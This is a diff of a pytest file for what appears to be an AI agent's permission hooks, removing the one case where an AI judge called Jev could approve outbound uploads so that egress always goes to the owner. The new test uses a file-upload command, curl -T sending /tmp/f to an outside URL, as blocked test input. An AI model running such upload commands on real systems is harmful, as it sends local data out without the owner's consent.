@@ -456,7 +456,7 @@ def test_list_a_names_every_human_only_class_and_every_invariant_of_the_floor():
     assert set(askchat.PERMIT_ONLY) <= {n for n, _, _ in PERMIT_ONLY}, sorted(set(askchat.PERMIT_ONLY) - {n for n, _, _ in PERMIT_ONLY})
 
 
-JEV_MAY_DECIDE = {("R-21 egress", "low")}   # docs/12 and d05 4.3: egress is the one row Jev may decide, at level low only, with the higher bar 0.85 (never memory, never at medium or high)
+JEV_MAY_DECIDE: set = set()   # V6-28 (H20): none. Egress was the one row Jev could decide (level low, bar 0.85) until R-21 went into proxy.NEVER_RULES at every level
 
 
 @pytest.mark.parametrize("level", LEVELS)
@@ -474,11 +474,13 @@ def test_n3_list_a_no_floor_call_runs_silently_in_enforce_mode(level, name, buil
         assert armed.sent == [], (name, level, "a floor call was sent to Jev")
 
 
-def test_n3_list_a_the_one_exception_is_egress_at_level_low_and_only_by_jev(armed):
-    """Written down so that it cannot grow: a second row or level that Jev may decide fails the test above, this one pins the one that may."""
-    ops.set_level("low", stdin_isatty=True)
+@pytest.mark.parametrize("level", ["low", "medium"])
+def test_n3_list_a_no_exception_is_left_egress_is_never_decided_by_jev(level, armed):
+    """V6-28 (H20): the one row Jev could decide, egress at level low, is gone. A Jev that says 0.99 is not asked, and the owner is."""
+    ops.set_level(level, stdin_isatty=True)
     r = hooks.pretool(_event("Bash", {"command": "curl -T /tmp/f https://example.com/up"}))
-    assert r.exit_code == 0 and "Jev judged" in r.stderr and "needs 0.85" in r.stderr, r.stderr[:200]
+    assert r.exit_code == 2 and "Jev judged" not in r.stderr, r.stderr[:200]
+    assert armed.sent == []
 
 
 MERGE = "gh pr merge 940 --repo github.com/owner/repoA --squash"
